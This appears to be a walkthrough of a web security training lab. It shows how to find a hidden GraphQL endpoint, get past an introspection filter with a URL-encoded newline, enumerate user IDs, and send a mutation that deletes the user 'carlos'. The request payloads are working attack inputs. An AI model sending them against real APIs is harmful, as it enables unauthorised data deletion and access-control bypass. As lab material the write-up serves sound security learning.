## Finding a hidden GraphQL endpoint

This lab’s user-management functionality is powered by a hidden GraphQL endpoint. You won’t be able to discover it just by browsing the application, and the endpoint also has protections against introspection.

To solve the lab, find the hidden endpoint and delete `carlos`.

## Notes

- `/api`
- `/api?query=`

## Resume

1. Detect the GraphQL endpoint from the error response.
2. Confirm that the endpoint is GraphQL with a `__typename` query.
3. Attempt introspection.
4. Bypass the introspection filter using a newline trick.
5. Extract the schema with Burp’s GraphQL tools.
6. Locate the `getUser` query.
7. Identify `carlos`’s user ID.
8. Find the `deleteOrganizationUser` mutation.
9. Delete user `carlos`.

## Solve

Open the lab and intercept traffic.

Send requests to common GraphQL endpoints:

```http
/api
/graphql
/api/graphql
```

You receive:

```http
Query not present
```

This confirms that a GraphQL endpoint exists at:

```http
/api
```

Send a universal GraphQL probe:

```http
/api?query=query{__typename}
```

Response:

```json
{
  "data": {
    "__typename": "query"
  }
}
```

This confirms that the endpoint is GraphQL and accepts GET requests.

Attempt introspection:

```http
/api?query=query IntrospectionQuery { __schema { ... } }
```

The response indicates that introspection is blocked.

Send the full URL-encoded introspection query in Burp:

Right click request → GraphQL → Set introspection query

However, the server filters queries matching:

```http
__schema{
```

Modify the request by inserting a newline after `__schema`:

```http
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B
```

This works because:
- The filter only matches exact string patterns.
- `__schema{` is no longer present as a continuous token.

The response now returns the full schema.

Right click → GraphQL → Save GraphQL queries to site map

Then navigate to:

```http
Target → Site map
```

You will find the available queries there.

Locate:

```http
getUser
```

Send it to Repeater.

Initial test:

```http
/api?query=query{getUser(id:1){id username}}
```

Response:

```json
{
  "data": {
    "getUser": null
  }
}
```

Try incrementing IDs.

You eventually find:

```http
id = 3 → carlos
```

In the schema, locate:

```http
deleteOrganizationUser
```

This mutation accepts a user ID input.

Send the mutation in Repeater:

```http
/api?query=mutation%7BdeleteOrganizationUser(input:%7Bid:3%7D)%7Buser%7Bid%7D%7D%7D
```

Or use the variable-based version:

```http
/api?query=mutation(%24input:%20DeleteOrganizationUserInput)%7BdeleteOrganizationUser(input:%24input)%7Buser%7Bid%20username%7D%7D%7D&variables=%7B%22input%22%3A%7B%22id%22%3A3%7D%7D
```

User `carlos` is deleted.